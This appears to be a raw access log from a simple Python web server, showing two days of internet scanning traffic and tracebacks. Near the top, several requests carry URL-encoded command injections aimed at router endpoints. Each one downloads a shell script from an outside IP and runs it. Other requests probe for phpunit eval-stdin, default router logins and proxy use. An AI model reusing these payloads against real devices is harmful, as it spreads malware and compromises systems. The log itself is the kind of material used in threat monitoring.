+85.11.167.132 - - [30/Aug/2026 15:33:31] "GET /form/smacfilter_conf?enable=%3Bcd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F118.145.196.225%3A800%2Fwget.sh%3B+busybox+wget+http%3A%2F%2F118.145.196.225%3A800%2Fwget.sh%3B+sh+wget.sh+aitemi.m300%3B HTTP/1.1" 404 -
+85.11.167.132 - - [30/Aug/2026 15:33:34] code 404, message File not found
+85.11.167.132 - - [30/Aug/2026 15:33:34] "GET /form/smacfilter_conf?mac=%3Bcd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F118.145.196.225%3A800%2Fwget.sh%3B+busybox+wget+http%3A%2F%2F118.145.196.225%3A800%2Fwget.sh%3B+sh+wget.sh+aitemi.m300%3B HTTP/1.1" 404 -
+85.11.167.132 - - [30/Aug/2026 15:33:34] code 404, message File not found
+85.11.167.132 - - [30/Aug/2026 15:33:34] "GET /smacfilter_conf?name=%3Bcd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F118.145.196.225%3A800%2Fwget.sh%3B+busybox+wget+http%3A%2F%2F118.145.196.225%3A800%2Fwget.sh%3B+sh+wget.sh+aitemi.m300%3B HTTP/1.1" 404 -
+85.11.167.132 - - [30/Aug/2026 15:33:34] code 501, message Unsupported method ('POST')
+85.11.167.132 - - [30/Aug/2026 15:33:34] "POST /laravel52/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 501 -
+85.11.167.132 - - [30/Aug/2026 15:33:34] code 501, message Unsupported method ('POST')
+85.11.167.132 - - [30/Aug/2026 15:33:34] "POST /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 501 -
+85.11.167.132 - - [30/Aug/2026 15:33:54] code 501, message Unsupported method ('POST')
+85.11.167.132 - - [30/Aug/2026 15:33:54] "POST /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 501 -
+85.11.167.132 - - [30/Aug/2026 15:33:54] code 404, message File not found
+85.11.167.132 - - [30/Aug/2026 15:33:54] "GET /smacfilter_conf?enable=%3Bcd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F118.145.196.225%3A800%2Fwget.sh%3B+busybox+wget+http%3A%2F%2F118.145.196.225%3A800%2Fwget.sh%3B+sh+wget.sh+aitemi.m300%3B HTTP/1.1" 404 -
+85.11.167.132 - - [30/Aug/2026 15:33:56] code 404, message File not found
+85.11.167.132 - - [30/Aug/2026 15:33:56] "GET /smacfilter_conf?mac=%3Bcd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F118.145.196.225%3A800%2Fwget.sh%3B+busybox+wget+http%3A%2F%2F118.145.196.225%3A800%2Fwget.sh%3B+sh+wget.sh+aitemi.m300%3B HTTP/1.1" 404 -
+85.11.167.132 - - [30/Aug/2026 15:34:00] code 404, message File not found
+85.11.167.132 - - [30/Aug/2026 15:34:00] "GET /apply.cgi?name=%3Bcd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F118.145.196.225%3A800%2Fwget.sh%3B+busybox+wget+http%3A%2F%2F118.145.196.225%3A800%2Fwget.sh%3B+sh+wget.sh+aitemi.m300%3B HTTP/1.1" 404 -
+85.11.167.132 - - [30/Aug/2026 15:34:00] code 404, message File not found
+85.11.167.132 - - [30/Aug/2026 15:34:00] "GET /apply.cgi?enable=%3Bcd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F118.145.196.225%3A800%2Fwget.sh%3B+busybox+wget+http%3A%2F%2F118.145.196.225%3A800%2Fwget.sh%3B+sh+wget.sh+aitemi.m300%3B HTTP/1.1" 404 -
+85.11.167.132 - - [30/Aug/2026 15:34:00] code 404, message File not found
+85.11.167.132 - - [30/Aug/2026 15:34:00] "GET /apply.cgi?mac=%3Bcd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F118.145.196.225%3A800%2Fwget.sh%3B+busybox+wget+http%3A%2F%2F118.145.196.225%3A800%2Fwget.sh%3B+sh+wget.sh+aitemi.m300%3B HTTP/1.1" 404 -
+14.1.104.151 - - [30/Aug/2026 16:38:55] code 404, message File not found
+14.1.104.151 - - [30/Aug/2026 16:38:55] "GET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0" 404 -
+204.76.203.49 - - [30/Aug/2026 16:40:51] code 501, message Unsupported method ('CONNECT')
+204.76.203.49 - - [30/Aug/2026 16:40:51] "CONNECT api.i.pn:443 HTTP/1.1" 501 -
+204.76.203.49 - - [30/Aug/2026 16:40:56] code 400, message Bad request syntax ('\\x05\\x01\\x00')
+204.76.203.49 - - [30/Aug/2026 16:40:56] "\x05\x01\x00" 400 -
+195.182.16.23 - - [30/Aug/2026 17:00:14] code 404, message File not found
+195.182.16.23 - - [30/Aug/2026 17:00:14] "GET /SDK/webLanguage HTTP/1.1" 404 -
+45.198.224.27 - - [30/Aug/2026 18:40:59] code 501, message Unsupported method ('POST')
+45.198.224.27 - - [30/Aug/2026 18:40:59] "POST /goform/set_LimitClient_cfg HTTP/1.1" 501 -
+152.32.209.62 - - [30/Aug/2026 18:49:05] "GET / HTTP/1.1" 200 -
+152.32.209.62 - - [30/Aug/2026 18:49:05] code 404, message File not found
+152.32.209.62 - - [30/Aug/2026 18:49:05] "GET /favicon.ico HTTP/1.1" 404 -
+152.32.209.62 - - [30/Aug/2026 18:49:06] "GET /assets/index-DqAnZJUf.js HTTP/1.1" 200 -
+152.32.209.62 - - [30/Aug/2026 18:49:07] code 404, message File not found
+152.32.209.62 - - [30/Aug/2026 18:49:07] "GET /robots.txt HTTP/1.1" 404 -
+152.32.209.62 - - [30/Aug/2026 18:49:07] code 404, message File not found
+152.32.209.62 - - [30/Aug/2026 18:49:07] "GET /sitemap.xml HTTP/1.1" 404 -
+154.197.57.205 - - [30/Aug/2026 19:09:07] "GET / HTTP/1.1" 200 -
+154.197.57.205 - - [30/Aug/2026 19:09:08] code 404, message File not found
+154.197.57.205 - - [30/Aug/2026 19:09:08] "GET /favicon.ico HTTP/1.1" 404 -
+154.197.57.205 - - [30/Aug/2026 19:10:11] code 404, message File not found
+154.197.57.205 - - [30/Aug/2026 19:10:11] "GET /favicon.ico HTTP/1.1" 404 -
+91.92.40.188 - - [30/Aug/2026 19:25:38] code 404, message File not found
+91.92.40.188 - - [30/Aug/2026 19:25:38] "GET /login HTTP/1.1" 404 -
+62.171.146.116 - - [30/Aug/2026 19:49:31] code 400, message Bad request version ('À\\x14À')
+62.171.146.116 - - [30/Aug/2026 19:49:31] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03#I¹¯À+íçÉ·ê\x00\x190*áDØaCÈxÒ|\x10\x95\x80ÊêÊ¥S \x8eRQ\x9fV¸|Ù7à\x03í\x91\x02¶\x87û\x85!\x0cÝå\x0e\\o\x90g¹i\x01Ò3\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" 400 -
+94.154.43.201 - - [30/Aug/2026 20:21:18] code 404, message File not found
+94.154.43.201 - - [30/Aug/2026 20:21:18] "GET /login HTTP/1.1" 404 -
+----------------------------------------
+Exception occurred during processing of request from ('45.79.115.134', 52094)
+Traceback (most recent call last):
+  File "/usr/lib/python3.12/socketserver.py", line 692, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.12/http/server.py", line 1311, in finish_request
+    self.RequestHandlerClass(request, client_address, self,
+  File "/usr/lib/python3.12/http/server.py", line 672, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.12/socketserver.py", line 761, in __init__
+    self.handle()
+  File "/usr/lib/python3.12/http/server.py", line 436, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.12/http/server.py", line 404, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+                           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.12/socket.py", line 707, in readinto
+    return self._sock.recv_into(b)
+           ^^^^^^^^^^^^^^^^^^^^^^^
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+45.79.115.134 - - [30/Aug/2026 20:40:49] "GET / HTTP/1.1" 200 -
+45.79.149.61 - - [30/Aug/2026 20:43:35] "GET / HTTP/1.1" 200 -
+193.8.186.31 - - [30/Aug/2026 21:09:09] code 400, message Bad request version ("{Í>Ì\\x00\\\\\\x13\\x02\\x13\\x03\\x13\\x01À,À0Ì©Ì¨À¯À\\xadÀ]ÀaÀ+À/À®À¬À\\\\À`À$À(ÀsÀwÀ#À'ÀrÀvÀ")
+193.8.186.31 - - [30/Aug/2026 21:09:09] "\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03ý=\x9fI5\x06ÛÀÄ)^í+\x97\x1eÍ$cc)F±\x0f ~iRLeOj, \x1bSáÇ%¼V©èÀOá\x83\x99òOÄ$\x8a·1ØØ\x06më\x9c {Í>Ì\x00\\\x13\x02\x13\x03\x13\x01À,À0Ì©Ì¨À¯À­À]ÀaÀ+À/À®À¬À\\À`À$À(ÀsÀwÀ#À'ÀrÀvÀ" 400 -
+193.8.186.31 - - [30/Aug/2026 21:09:09] "GET / HTTP/1.1" 200 -
+18.218.118.203 - - [30/Aug/2026 21:13:48] "GET / HTTP/1.1" 200 -
+18.218.118.203 - - [30/Aug/2026 21:15:39] "GET / HTTP/1.1" 200 -
+45.198.224.27 - - [30/Aug/2026 21:15:56] code 404, message File not found
+45.198.224.27 - - [30/Aug/2026 21:15:56] "GET /login HTTP/1.1" 404 -
+18.218.118.203 - - [30/Aug/2026 21:16:46] code 400, message Bad request version ('À\\x14À')
+18.218.118.203 - - [30/Aug/2026 21:16:46] "\x16\x03\x01\x01\x00\x01\x00\x00ü\x03\x03Þ\x19¥Ñ\x81\x97¤3\x04¥he¿ª\x86~\x8d½<áý³ Ý\x09Ç¨G{ñÔ\x08 \x14å\x1a{¤\x86!T¥}Þf\x84v\x0eþ~\x1bò%Ñ\x8c\x06À«Ë\x89bz$°\x07\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" 400 -
+18.218.118.203 - - [30/Aug/2026 21:18:47] code 400, message Bad request syntax ('\\x16\\x03\\x01\\x00î\\x01\\x00\\x00ê\\x03\\x03\\x12,íºÊ\\x05!\\x83\\x950h7z¿KQP\\x0f×WQºi')
+18.218.118.203 - - [30/Aug/2026 21:18:47] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03\x12,íºÊ\x05!\x83\x950h7z¿KQP\x0f×WQºi" 400 -
+----------------------------------------
+Exception occurred during processing of request from ('45.79.207.110', 50343)
+Traceback (most recent call last):
+  File "/usr/lib/python3.12/socketserver.py", line 692, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.12/http/server.py", line 1311, in finish_request
+    self.RequestHandlerClass(request, client_address, self,
+  File "/usr/lib/python3.12/http/server.py", line 672, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.12/socketserver.py", line 761, in __init__
+    self.handle()
+  File "/usr/lib/python3.12/http/server.py", line 436, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.12/http/server.py", line 404, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+                           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.12/socket.py", line 707, in readinto
+    return self._sock.recv_into(b)
+           ^^^^^^^^^^^^^^^^^^^^^^^
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+45.79.207.110 - - [30/Aug/2026 21:40:25] "GET / HTTP/1.1" 200 -
+172.236.239.55 - - [30/Aug/2026 21:47:17] "GET / HTTP/1.1" 200 -
+94.154.43.140 - - [30/Aug/2026 22:19:40] code 404, message File not found
+94.154.43.140 - - [30/Aug/2026 22:19:40] "GET /login HTTP/1.1" 404 -
+94.154.43.250 - - [30/Aug/2026 22:29:04] code 501, message Unsupported method ('CONNECT')
+94.154.43.250 - - [30/Aug/2026 22:29:04] "CONNECT ipinfo.io:443 HTTP/1.1" 501 -
+----------------------------------------
+Exception occurred during processing of request from ('69.164.217.74', 39477)
+Traceback (most recent call last):
+  File "/usr/lib/python3.12/socketserver.py", line 692, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.12/http/server.py", line 1311, in finish_request
+    self.RequestHandlerClass(request, client_address, self,
+  File "/usr/lib/python3.12/http/server.py", line 672, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.12/socketserver.py", line 761, in __init__
+    self.handle()
+  File "/usr/lib/python3.12/http/server.py", line 436, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.12/http/server.py", line 404, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+                           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.12/socket.py", line 707, in readinto
+    return self._sock.recv_into(b)
+           ^^^^^^^^^^^^^^^^^^^^^^^
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+69.164.217.74 - - [30/Aug/2026 22:40:30] "GET / HTTP/1.1" 200 -
+172.239.64.84 - - [30/Aug/2026 22:45:14] "GET / HTTP/1.1" 200 -
+69.5.169.139 - - [30/Aug/2026 22:56:41] code 404, message File not found
+69.5.169.139 - - [30/Aug/2026 22:56:41] "GET /zc?action=getInfo HTTP/1.1" 404 -
+69.5.169.88 - - [30/Aug/2026 22:56:57] "GET / HTTP/1.1" 200 -
+69.5.169.105 - - [30/Aug/2026 22:56:57] code 404, message File not found
+69.5.169.105 - - [30/Aug/2026 22:56:57] "GET /favicon.ico HTTP/1.1" 404 -
+69.5.169.34 - - [30/Aug/2026 22:56:57] code 404, message File not found
+69.5.169.34 - - [30/Aug/2026 22:56:57] "GET /mcp HTTP/1.1" 404 -
+69.5.169.35 - - [30/Aug/2026 22:56:57] code 404, message File not found
+69.5.169.35 - - [30/Aug/2026 22:56:57] "GET /mcp/ HTTP/1.1" 404 -
+69.5.169.105 - - [30/Aug/2026 22:56:57] "GET / HTTP/1.1" 200 -
+69.5.169.41 - - [30/Aug/2026 22:56:57] code 404, message File not found
+69.5.169.41 - - [30/Aug/2026 22:56:57] "GET /api/mcp HTTP/1.1" 404 -
+69.5.169.84 - - [30/Aug/2026 22:56:57] code 404, message File not found
+69.5.169.84 - - [30/Aug/2026 22:56:57] "GET /sse HTTP/1.1" 404 -
+147.185.132.75 - - [30/Aug/2026 23:19:41] "GET / HTTP/1.1" 200 -
+204.76.203.49 - - [30/Aug/2026 23:32:26] code 501, message Unsupported method ('CONNECT')
+204.76.203.49 - - [30/Aug/2026 23:32:26] "CONNECT api.i.pn:443 HTTP/1.1" 501 -
+204.76.203.49 - - [30/Aug/2026 23:32:31] code 400, message Bad request syntax ('\\x05\\x01\\x00')
+204.76.203.49 - - [30/Aug/2026 23:32:31] "\x05\x01\x00" 400 -
+152.243.213.247 - - [30/Aug/2026 23:44:32] code 404, message File not found
+152.243.213.247 - - [30/Aug/2026 23:44:32] "GET http://a7x.overflow.biz/hachk.php HTTP/1.1" 404 -
+94.154.43.140 - - [31/Aug/2026 00:31:50] code 404, message File not found
+94.154.43.140 - - [31/Aug/2026 00:31:50] "GET /login HTTP/1.1" 404 -
+20.65.217.120 - - [31/Aug/2026 00:32:16] "GET / HTTP/1.1" 200 -
+20.65.217.120 - - [31/Aug/2026 00:32:17] code 400, message Bad request syntax ('MGLNDD_178.104.53.233_8080')
+20.65.217.120 - - [31/Aug/2026 00:32:17] "MGLNDD_178.104.53.233_8080" 400 -
+180.149.126.13 - - [31/Aug/2026 01:14:19] code 404, message File not found
+180.149.126.13 - - [31/Aug/2026 01:14:19] "GET /c/ HTTP/1.1" 404 -
+45.9.168.192 - - [31/Aug/2026 01:22:23] code 400, message Bad request version ('Ý%d1\\x17¦%nÅ')
+45.9.168.192 - - [31/Aug/2026 01:22:23] "É\x94Ñ¦®\x9c\x05lM/\x09\x8cp#î\x9d*5#]ÇR:È\x8e/\x11¸Í\x89Zû¤\x19fÒÎ³¡\x81»ü Ý%d1\x17¦%nÅ" 400 -
+71.6.167.142 - - [31/Aug/2026 01:43:34] "GET / HTTP/1.1" 200 -
+71.6.167.142 - - [31/Aug/2026 01:43:36] code 404, message File not found
+71.6.167.142 - - [31/Aug/2026 01:43:36] "GET /favicon.ico HTTP/1.1" 404 -
+94.154.43.70 - - [31/Aug/2026 01:51:47] code 404, message File not found
+94.154.43.70 - - [31/Aug/2026 01:51:47] "GET /login HTTP/1.1" 404 -
+176.65.139.206 - - [31/Aug/2026 02:03:42] code 501, message Unsupported method ('POST')
+176.65.139.206 - - [31/Aug/2026 02:03:42] "POST /cgi-bin/luci/;stok=/locale?form=country HTTP/1.1" 501 -
+45.135.193.198 - - [31/Aug/2026 02:18:29] code 400, message Bad request version ('À\\x13À')
+45.135.193.198 - - [31/Aug/2026 02:18:29] "\x16\x03\x01\x00ê\x01\x00\x00æ\x03\x03=_V\x13L\x9fïZ»\x94L\x1d nj\x8dÌ]Ùªrìës\x83\x06\x80>\x9aðßÄ \x91J\x07\x1b!·Yø°\x09~¦\x94<?\x09ðª?ÝfïÝ\x82\x0d+?qé-O\x88\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À" 400 -
+45.135.193.198 - - [31/Aug/2026 02:18:29] "GET / HTTP/1.0" 200 -
+205.210.31.169 - - [31/Aug/2026 02:29:17] "GET / HTTP/1.0" 200 -
+66.132.186.174 - - [31/Aug/2026 03:16:54] code 400, message Bad request version ('ÏYò\\x8bãzsÉè*¯')
+66.132.186.174 - - [31/Aug/2026 03:16:54] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03±°~«mzË6ÄÈ\x12\x85ÔDW\x03Óö7\x05~©\x10I.ã=6m\x1dLö ÏYò\x8bãzsÉè*¯" 400 -
+66.132.172.188 - - [31/Aug/2026 03:17:37] code 400, message Bad request syntax ('\\x16\\x03\\x01\\x00î\\x01\\x00\\x00ê\\x03\\x03ø.üäKÿñáoP-q')
+66.132.172.188 - - [31/Aug/2026 03:17:37] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03ø.üäKÿñáoP-q" 400 -
+66.132.172.188 - - [31/Aug/2026 03:17:41] "GET / HTTP/1.1" 200 -
+66.132.172.188 - - [31/Aug/2026 03:17:42] code 505, message Invalid HTTP version (2.0)
+66.132.172.188 - - [31/Aug/2026 03:17:42] "PRI * HTTP/2.0" 505 -
+66.132.172.188 - - [31/Aug/2026 03:17:46] code 404, message File not found
+66.132.172.188 - - [31/Aug/2026 03:17:46] "GET /favicon.ico HTTP/1.1" 404 -
+66.132.172.188 - - [31/Aug/2026 03:18:01] code 400, message Bad request version ('À\\x14À')
+66.132.172.188 - - [31/Aug/2026 03:18:01] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03M\x82t\x9a5¦% TÔXá\x926ð\x82\x7f\x1cZ\x8bd\x95ä!¬V\x1cÒn\x02Î* \x1d¥\x1eC\x87\x02vü¯ä®¢\x84¿è\x1a)Õ¤+2\x9d \x9dí\x9e<d\x1fÝð^\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" 400 -
+66.132.172.188 - - [31/Aug/2026 03:18:05] code 404, message File not found
+66.132.172.188 - - [31/Aug/2026 03:18:05] "GET /.well-known/security.txt HTTP/1.1" 404 -
+66.132.172.132 - - [31/Aug/2026 03:18:12] code 400, message Bad request version ('À\\x14À')
+66.132.172.132 - - [31/Aug/2026 03:18:12] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03\x9bü\x9eòÇ\x97\x96À¹û£N^\x8bu$×­ë\x81ù\x16\x15ýÐç\x1ddÑa-¯ \x93.L\x0b"9¨§r"mº\x15ù²¤\x09ï\x86!g/ý\x9cÚ¼où\x8b\x0b%\x8a\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" 400 -
+66.132.172.132 - - [31/Aug/2026 03:18:13] "GET / HTTP/1.1" 200 -
+66.132.172.132 - - [31/Aug/2026 03:18:14] code 505, message Invalid HTTP version (2.0)
+66.132.172.132 - - [31/Aug/2026 03:18:14] "PRI * HTTP/2.0" 505 -
+66.132.172.132 - - [31/Aug/2026 03:18:14] code 404, message File not found
+66.132.172.132 - - [31/Aug/2026 03:18:14] "GET /favicon.ico HTTP/1.1" 404 -
+66.132.172.132 - - [31/Aug/2026 03:18:57] code 400, message Bad request version ('À\\x14À')
+66.132.172.132 - - [31/Aug/2026 03:18:57] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03Y\x82ð­â\x94Níè_8B\x9báDíÍhµQïæ\x9f8yÐû\x11à\x1e£î æ>¹9\x8f\x86½!\x17³\x86\x99\x0bê0Í¨\x9eSÓë:eaÜ¼ä\x00_J\x16Í\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" 400 -
+66.132.172.132 - - [31/Aug/2026 03:18:58] code 404, message File not found
+66.132.172.132 - - [31/Aug/2026 03:18:58] "GET /robots.txt HTTP/1.1" 404 -
+152.243.213.247 - - [31/Aug/2026 03:43:35] code 404, message File not found
+152.243.213.247 - - [31/Aug/2026 03:43:35] "GET http://a7x.overflow.biz/hachk.php HTTP/1.1" 404 -
+151.245.151.42 - - [31/Aug/2026 03:57:09] "GET / HTTP/1.1" 200 -
+151.245.151.42 - - [31/Aug/2026 03:57:09] code 404, message File not found
+151.245.151.42 - - [31/Aug/2026 03:57:09] "GET /favicon.ico HTTP/1.1" 404 -
+204.76.203.49 - - [31/Aug/2026 04:42:50] code 501, message Unsupported method ('CONNECT')
+204.76.203.49 - - [31/Aug/2026 04:42:50] "CONNECT api.i.pn:443 HTTP/1.1" 501 -
+204.76.203.49 - - [31/Aug/2026 04:42:55] code 400, message Bad request syntax ('\\x05\\x01\\x00')
+204.76.203.49 - - [31/Aug/2026 04:42:55] "\x05\x01\x00" 400 -
+45.198.224.27 - - [31/Aug/2026 05:13:29] code 501, message Unsupported method ('POST')
+45.198.224.27 - - [31/Aug/2026 05:13:29] "POST /goform/set_LimitClient_cfg HTTP/1.1" 501 -
+94.154.43.140 - - [31/Aug/2026 05:29:26] code 404, message File not found
+94.154.43.140 - - [31/Aug/2026 05:29:26] "GET /login HTTP/1.1" 404 -
+141.94.97.115 - - [31/Aug/2026 05:48:32] "GET / HTTP/1.0" 200 -
+205.210.31.209 - - [31/Aug/2026 05:52:30] code 400, message Bad request version ('À\\x13À')
+205.210.31.209 - - [31/Aug/2026 05:52:30] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03KÈ\x82¡öË£\x1e·û\x19`DVªÔ=2\\6fÑÀkI_<\x02ß¢áG Ütóóäù§©XàW\x15&w@"Îh\x037\x9b\x89·A?\x7fü\x9b®#\x98Î\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À" 400 -
+205.210.31.209 - - [31/Aug/2026 05:52:31] code 400, message Bad request version ('À(À$À\\x14À')
+205.210.31.209 - - [31/Aug/2026 05:52:31] "\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03À­\x19²}´°\x13Å\x0d1#?,m\x1a¶[:2ºB\x87c\x99ì0æJ\x83Á(\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À\x09À(À$À\x14À" 400 -
+194.88.98.91 - - [31/Aug/2026 05:53:39] code 404, message File not found
+194.88.98.91 - - [31/Aug/2026 05:53:39] "GET /zc?action=getInfo HTTP/1.1" 404 -
+69.5.169.32 - - [31/Aug/2026 05:53:55] "GET / HTTP/1.1" 200 -
+69.5.169.97 - - [31/Aug/2026 05:53:55] code 404, message File not found
+69.5.169.97 - - [31/Aug/2026 05:53:55] "GET /favicon.ico HTTP/1.1" 404 -
+69.5.169.118 - - [31/Aug/2026 05:53:55] code 404, message File not found
+69.5.169.118 - - [31/Aug/2026 05:53:55] "GET /mcp/ HTTP/1.1" 404 -
+69.5.169.97 - - [31/Aug/2026 05:53:55] code 404, message File not found
+69.5.169.26 - - [31/Aug/2026 05:53:55] code 404, message File not found
+69.5.169.97 - - [31/Aug/2026 05:53:55] "GET /mcp HTTP/1.1" 404 -
+69.5.169.26 - - [31/Aug/2026 05:53:55] "GET /api/mcp HTTP/1.1" 404 -
+69.5.169.124 - - [31/Aug/2026 05:53:55] "GET / HTTP/1.1" 200 -
+69.5.169.119 - - [31/Aug/2026 05:53:55] code 404, message File not found
+69.5.169.119 - - [31/Aug/2026 05:53:55] "GET /sse HTTP/1.1" 404 -
+119.56.75.8 - - [31/Aug/2026 05:57:06] code 404, message File not found
+119.56.75.8 - - [31/Aug/2026 05:57:06] "GET /favicon.ico HTTP/1.1" 404 -
+119.56.75.8 - - [31/Aug/2026 05:57:09] "GET /refs/ HTTP/1.1" 200 -
+119.56.75.8 - - [31/Aug/2026 05:57:10] "GET /refs/chazihu.png HTTP/1.1" 200 -
+119.56.75.8 - - [31/Aug/2026 05:57:10] "GET /refs/chazihu-lid.png HTTP/1.1" 200 -
+119.56.75.8 - - [31/Aug/2026 05:57:10] "GET /refs/cha_revolve.png HTTP/1.1" 200 -
+119.56.75.8 - - [31/Aug/2026 05:57:10] "GET /refs/cha_plan.png HTTP/1.1" 200 -
+119.56.75.8 - - [31/Aug/2026 05:57:10] "GET /refs/cha_sym.png HTTP/1.1" 200 -
+119.56.75.8 - - [31/Aug/2026 05:57:10] "GET /refs/shipiao_two.png HTTP/1.1" 200 -
+119.56.75.8 - - [31/Aug/2026 05:57:10] "GET /refs/ziye_qc.png HTTP/1.1" 200 -
+119.56.75.8 - - [31/Aug/2026 05:57:10] "GET /refs/ziye_cmp.png HTTP/1.1" 200 -
+119.56.75.8 - - [31/Aug/2026 05:57:11] "GET /refs/jubian_sheet.png HTTP/1.1" 200 -
+119.56.75.8 - - [31/Aug/2026 05:57:11] "GET /refs/liufang.png HTTP/1.1" 200 -
+119.56.75.8 - - [31/Aug/2026 05:57:11] "GET /refs/liufang_cmp.png HTTP/1.1" 200 -
+119.56.75.8 - - [31/Aug/2026 05:57:11] "GET /refs/refs_measured.png HTTP/1.1" 200 -
+119.56.75.8 - - [31/Aug/2026 05:57:11] "GET /refs/liufang_qc.png HTTP/1.1" 200 -
+119.56.75.8 - - [31/Aug/2026 05:57:12] "GET /refs/refs_all.png HTTP/1.1" 200 -
+119.56.75.8 - - [31/Aug/2026 05:57:12] "GET /refs/dq11.png HTTP/1.1" 200 -
+119.56.75.8 - - [31/Aug/2026 05:57:12] "GET /refs/dq_compare6.png HTTP/1.1" 200 -
+119.56.75.8 - - [31/Aug/2026 05:57:12] "GET /refs/part_compare.png HTTP/1.1" 200 -
+119.56.75.8 - - [31/Aug/2026 05:57:12] "GET /refs/td_sweep.png HTTP/1.1" 200 -
+119.56.75.8 - - [31/Aug/2026 05:57:12] "GET /refs/qc_detail.png HTTP/1.1" 200 -
+119.56.75.8 - - [31/Aug/2026 05:57:14] "GET /refs/spout_zoom.png HTTP/1.1" 200 -
+119.56.75.8 - - [31/Aug/2026 05:57:14] "GET /refs/lip.png HTTP/1.1" 200 -
+119.56.75.8 - - [31/Aug/2026 05:57:14] "GET /refs/lid_sweep.png HTTP/1.1" 200 -
+119.56.75.8 - - [31/Aug/2026 05:57:15] "GET /refs/bead.png HTTP/1.1" 200 -
+119.56.75.8 - - [31/Aug/2026 05:57:15] "GET /refs/fillet.png HTTP/1.1" 200 -
+119.56.75.8 - - [31/Aug/2026 05:57:15] "GET /refs/knob.png HTTP/1.1" 200 -
+119.56.75.8 - - [31/Aug/2026 05:57:15] "GET /refs/neck_after.png HTTP/1.1" 200 -
+119.56.75.8 - - [31/Aug/2026 05:57:16] "GET /refs/qc_duoqiu2.png HTTP/1.1" 200 -
+119.56.75.8 - - [31/Aug/2026 05:57:16] "GET /refs/jingzhou.png HTTP/1.1" 200 -
+119.56.75.8 - - [31/Aug/2026 05:57:16] "GET /refs/xs_regress.png HTTP/1.1" 200 -
+119.56.75.8 - - [31/Aug/2026 05:57:17] "GET /refs/gp_regress.png HTTP/1.1" 200 -
+119.56.75.8 - - [31/Aug/2026 05:57:17] "GET /refs/pair.mp4 HTTP/1.1" 200 -
+119.56.75.8 - - [31/Aug/2026 05:57:39] "GET /refs/pair.mp4 HTTP/1.1" 200 -
+119.56.75.8 - - [31/Aug/2026 05:58:02] "GET /refs/ HTTP/1.1" 304 -
+119.56.75.8 - - [31/Aug/2026 05:58:02] "GET /refs/pair.mp4 HTTP/1.1" 200 -
+----------------------------------------
+Exception occurred during processing of request from ('119.56.75.8', 19737)
+Traceback (most recent call last):
+  File "/usr/lib/python3.12/socketserver.py", line 692, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.12/http/server.py", line 1311, in finish_request
+    self.RequestHandlerClass(request, client_address, self,
+  File "/usr/lib/python3.12/http/server.py", line 672, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.12/socketserver.py", line 761, in __init__
+    self.handle()
+  File "/usr/lib/python3.12/http/server.py", line 436, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.12/http/server.py", line 404, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+                           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.12/socket.py", line 707, in readinto
+    return self._sock.recv_into(b)
+           ^^^^^^^^^^^^^^^^^^^^^^^
+----------------------------------------
+ConnectionResetError: [Errno 104] Connection reset by peer
+Exception occurred during processing of request from ('119.56.75.8', 14397)
+----------------------------------------
+Traceback (most recent call last):
+  File "/usr/lib/python3.12/socketserver.py", line 692, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.12/http/server.py", line 1311, in finish_request
